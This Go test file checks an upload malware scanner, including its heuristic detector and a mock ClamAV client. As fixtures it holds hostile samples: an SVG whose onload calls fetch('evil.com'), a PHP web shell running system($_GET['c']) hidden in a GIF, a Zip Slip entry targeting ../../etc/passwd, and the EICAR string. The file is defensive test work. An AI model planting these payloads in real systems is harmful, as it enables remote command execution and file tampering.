package scanner

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"net"
	"strings"
	"testing"
	"time"
)

func TestHeuristicScanner_CleanFiles(t *testing.T) {
	scanner := NewHeuristicScanner()

	cleanPNG := []byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89")
	info := FileInfo{
		Filename:  "clean.png",
		Size:      int64(len(cleanPNG)),
		MIME:      "image/png",
		Extension: ".png",
	}

	res, err := scanner.Scan(context.Background(), bytes.NewReader(cleanPNG), int64(len(cleanPNG)), info)
	if err != nil {
		t.Fatalf("unexpected scan error: %v", err)
	}
	if !res.Clean {
		t.Errorf("expected clean result, got threat: %s", res.ThreatName)
	}
}

func TestHeuristicScanner_DisguisedExecutables(t *testing.T) {
	scanner := NewHeuristicScanner()

	// 1. PE binary disguised as JPG
	peBytes := []byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00")
	infoPE := FileInfo{
		Filename:  "avatar.jpg",
		Size:      int64(len(peBytes)),
		MIME:      "image/jpeg",
		Extension: ".jpg",
	}

	resPE, err := scanner.Scan(context.Background(), bytes.NewReader(peBytes), int64(len(peBytes)), infoPE)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if resPE.Clean {
		t.Errorf("expected PE binary disguised as JPG to be flagged")
	} else if resPE.ThreatName != "Executable.PE.Windows" {
		t.Errorf("expected Executable.PE.Windows, got %s", resPE.ThreatName)
	}

	// 2. Linux ELF disguised as PNG
	elfBytes := []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
	infoELF := FileInfo{
		Filename:  "logo.png",
		Size:      int64(len(elfBytes)),
		MIME:      "image/png",
		Extension: ".png",
	}

	resELF, err := scanner.Scan(context.Background(), bytes.NewReader(elfBytes), int64(len(elfBytes)), infoELF)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if resELF.Clean {
		t.Errorf("expected ELF binary disguised as PNG to be flagged")
	} else if resELF.ThreatName != "Executable.ELF.Linux" {
		t.Errorf("expected Executable.ELF.Linux, got %s", resELF.ThreatName)
	}
}

func TestHeuristicScanner_MaliciousSVG(t *testing.T) {
	scanner := NewHeuristicScanner()

	// SVG with embedded script
	badSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)
	info := FileInfo{
		Filename:  "vector.svg",
		Size:      int64(len(badSVG)),
		MIME:      "image/svg+xml",
		Extension: ".svg",
	}

	res, err := scanner.Scan(context.Background(), bytes.NewReader(badSVG), int64(len(badSVG)), info)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if res.Clean {
		t.Errorf("expected script in SVG to be blocked")
	}

	// SVG with event handler
	onloadSVG := []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('evil.com')"></svg>`)
	resOnload, err := scanner.Scan(context.Background(), bytes.NewReader(onloadSVG), int64(len(onloadSVG)), info)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if resOnload.Clean {
		t.Errorf("expected onload in SVG to be blocked")
	}
}

func TestHeuristicScanner_EmbeddedWebShell(t *testing.T) {
	scanner := NewHeuristicScanner()

	shellBytes := []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<?php system($_GET['c']); ?>")
	info := FileInfo{
		Filename:  "cute_cat.gif",
		Size:      int64(len(shellBytes)),
		MIME:      "image/gif",
		Extension: ".gif",
	}

	res, err := scanner.Scan(context.Background(), bytes.NewReader(shellBytes), int64(len(shellBytes)), info)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if res.Clean {
		t.Errorf("expected embedded PHP webshell to be blocked")
	}
}

func TestHeuristicScanner_ZipSlip(t *testing.T) {
	scanner := NewHeuristicScanner()

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create("../../etc/passwd")
	if err != nil {
		t.Fatalf("failed to create zip entry: %v", err)
	}
	_, _ = w.Write([]byte("root:x:0:0:root:/root:/bin/bash"))
	_ = zw.Close()

	zipData := buf.Bytes()
	info := FileInfo{
		Filename:  "archive.zip",
		Size:      int64(len(zipData)),
		MIME:      "application/zip",
		Extension: ".zip",
	}

	res, err := scanner.Scan(context.Background(), bytes.NewReader(zipData), int64(len(zipData)), info)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if res.Clean {
		t.Errorf("expected Zip Slip archive to be blocked")
	} else if res.ThreatName != "Archive.ZipSlip.PathTraversal" {
		t.Errorf("expected Archive.ZipSlip.PathTraversal, got %s", res.ThreatName)
	}
}

func TestClamAVScanner_MockServer(t *testing.T) {
	// Start mock ClamAV TCP server
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start mock listener: %v", err)
	}
	defer ln.Close()

	addr := ln.Addr().String()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go handleMockClamAV(conn)
		}
	}()

	client := NewClamAVScanner(addr)
	client.cfg.Timeout = 2 * time.Second

	// 1. Test Ping
	ctx := context.Background()
	if err := client.Ping(ctx); err != nil {
		t.Fatalf("clamav ping failed: %v", err)
	}

	// 2. Test Clean File
	cleanData := []byte("This is a clean document.")
	infoClean := FileInfo{
		Filename: "doc.txt",
		Size:     int64(len(cleanData)),
	}
	resClean, err := client.Scan(ctx, bytes.NewReader(cleanData), int64(len(cleanData)), infoClean)
	if err != nil {
		t.Fatalf("clean scan failed: %v", err)
	}
	if !resClean.Clean {
		t.Errorf("expected clean scan result, got threat: %s", resClean.ThreatName)
	}

	// 3. Test Infected File
	infectedData := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
	infoInfected := FileInfo{
		Filename: "eicar.com",
		Size:     int64(len(infectedData)),
	}
	resInfected, err := client.Scan(ctx, bytes.NewReader(infectedData), int64(len(infectedData)), infoInfected)
	if err != nil {
		t.Fatalf("infected scan failed: %v", err)
	}
	if resInfected.Clean {
		t.Errorf("expected infected file to be flagged")
	} else if resInfected.ThreatName != "Eicar-Test-Signature" {
		t.Errorf("expected Eicar-Test-Signature, got %s", resInfected.ThreatName)
	}
}

func handleMockClamAV(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	cmdBytes, err := reader.ReadBytes('\x00')
	if err != nil {
		return
	}
	cmd := string(cmdBytes)

	if strings.HasPrefix(cmd, "zPING") {
		_, _ = conn.Write([]byte("PONG\x00"))
		return
	}

	if strings.HasPrefix(cmd, "zINSTREAM") {
		var allData []byte
		lenBuf := make([]byte, 4)

		for {
			if _, err := io.ReadFull(reader, lenBuf); err != nil {
				return
			}
			chunkLen := binary.BigEndian.Uint32(lenBuf)
			if chunkLen == 0 {
				break // end of stream
			}
			chunk := make([]byte, chunkLen)
			if _, err := io.ReadFull(reader, chunk); err != nil {
				return
			}
			allData = append(allData, chunk...)
		}

		if strings.Contains(string(allData), "EICAR") {
			_, _ = conn.Write([]byte("stream: Eicar-Test-Signature FOUND\x00"))
		} else {
			_, _ = conn.Write([]byte("stream: OK\x00"))
		}
	}
}

func TestMultiScanner(t *testing.T) {
	heur := NewHeuristicScanner()
	noop := NewNoopScanner()
	multi := NewMultiScanner(heur, noop)

	cleanData := []byte("clean data content")
	info := FileInfo{Filename: "clean.txt", Size: int64(len(cleanData))}

	res, err := multi.Scan(context.Background(), bytes.NewReader(cleanData), int64(len(cleanData)), info)
	if err != nil {
		t.Fatalf("multi scan error: %v", err)
	}
	if !res.Clean {
		t.Errorf("expected clean result")
	}
}
